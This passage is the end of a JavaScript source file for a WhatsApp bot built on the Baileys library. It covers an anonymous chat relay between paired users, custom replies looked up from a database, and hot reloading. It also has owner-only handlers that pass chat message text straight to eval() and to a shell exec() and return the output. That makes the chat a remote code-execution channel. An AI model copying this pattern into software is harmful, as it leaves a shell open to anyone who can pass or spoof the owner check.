                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    ElgazarBot.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
